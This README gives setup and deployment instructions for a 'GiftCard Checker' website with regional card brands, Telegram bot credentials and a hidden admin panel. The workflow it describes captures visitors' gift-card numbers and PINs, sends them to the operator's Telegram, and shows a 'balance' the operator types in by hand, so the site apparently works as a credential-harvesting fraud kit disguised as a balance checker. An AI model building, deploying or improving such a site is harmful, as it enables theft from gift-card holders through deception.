# GiftCard Checker Website

## Setup Instructions

### 1. Add Your Card Images

The **top carousel** lists **20** cards. Paths and labels live in `config.js` as as `CAROUSEL_CARDS`. By default the first five use:

- `razer.png`, `itunes.png`, `stc.png`, `mobily.png`, `lebara.png`

Slots 6–20 use `card6.png` … `card20.png` (see `CAROUSEL_CARDS` for exact `img` paths). You can switch any entry to `.jpg`, `.jpeg`, `.avif`, or `.webp` by changing the `img` string in `config.js` so it matches the real filename.

**Formats:** Modern browsers load **JPEG/JPG**, **PNG**, **WebP**, and **AVIF** from `<img src="...">` as long as the file extension and path are correct—no need to convert unless you want a single format for consistency. Optional: use a `<picture>` element with AVIF + JPEG fallbacks for smaller files on very old browsers.

Recommended size: portrait ratio (e.g. 200×300px) looks best.

---

### 2. Configure Telegram

Edit `config.js` and replace the placeholder values:

```js
TELEGRAM_BOT_TOKEN: 'YOUR_BOT_TOKEN_HERE',   // from @BotFather on Telegram
TELEGRAM_CHAT_ID:   'YOUR_CHAT_ID_HERE',      // your Telegram user/group ID
```

**How to get your Bot Token:**
1. Open Telegram, search @BotFather
2. Send `/newbot` and follow instructions
3. Copy the token it gives you

**How to get your Chat ID:**
1. Search @userinfobot on Telegram
2. Send it `/start` — it replies with your chat ID

---

### 3. Set Admin Password

Open `admin.html` and find this line near the bottom:

```js
const ADMIN_PASSWORD = 'admin1234';
```

Change `admin1234` to any password you want. The public site has **no link** to the admin page—open the admin in the browser by URL only (so users do not see it in the header).

---

### 4. How the System Works

1. **User** enters card number + PIN on the main site → clicks Check Balance
2. **You receive a Telegram message** with the card details and a Request ID
3. **Open the admin URL** in your browser (not linked on the public site) — e.g. `https://your-project.vercel.app/admin` or `https://your-project.vercel.app/admin.html` — and enter your password
4. You'll see the pending request listed with full card details
5. **Enter the balance** (e.g. `SAR 250.00`) and click ✓ Set Balance
6. The user's browser automatically shows the balance (it polls every 3 seconds)

If you click **✗ Invalid**, the user sees an error message instead.

---

### 5. Deploy (Vercel)

This project includes `package.json` and a `build` script that copies HTML, JS, CSS, and `public/` into `dist/`. On Vercel, **set this explicitly** so the wrong framework is not auto-detected (a `public` folder with `index.html` at the repo root is often mis-detected; that can produce an **empty build** and a **404 NOT_FOUND** on `*.vercel.app`).

1. Import the [GitHub](https://github.com) repo in [Vercel](https://vercel.com) (or use the Vercel CLI).
2. **Settings → General → Root Directory:** the folder that contains `index.html` and `package.json` (use `.` if they are at the repository root).
3. **Settings → General → Framework Preset:** **Other** (or “No framework” / “N/A” — not Vite, Next, or Create React App).
4. **Settings → Build and Deployment**
   - **Build Command:** `npm run build`
   - **Output Directory:** `dist`
   - **Install Command:** `npm install` (default is fine; there are no dependencies).
5. Save, then **Redeploy** the latest production deployment.
6. Open `https://<your-project>.vercel.app/`. The **admin** is at **`/admin`** or **`/admin.html`** (see `vercel.json` rewrites). Same host keeps `localStorage` working for the check flow + admin.

**If you still see 404:** confirm the production deployment log shows `npm run build` finishing and “Static build: files copied to dist/”.

**Other static hosts (Netlify, cPanel, etc.):** upload the same files, or run `npm run build` locally and upload the `dist/` folder. Use `/admin.html` if the host does not support rewrites.

**Note:** `localStorage` is shared only when the **user page and the admin are on the same origin** (e.g. both on `yoursite.vercel.app`). Open admin on the same deployment, not a different domain.

---

### Files Overview

```
vercel.json     — Serves /admin and /admin/ as admin.html (Vercel)
index.html      — Main user-facing page (no admin link in the UI)
admin.html      — Admin panel (password protected)
style.css       — All styles
app.js          — Main logic + Telegram + polling + carousel
config.js       — Telegram credentials + CAROUSEL_CARDS (20 slider entries)
public/
  images/       — Card art (paths in config.js)
package.json    — `npm run build` copies the site to dist/ (Vercel)
scripts/        — build-static.cjs (used by the build script)
```
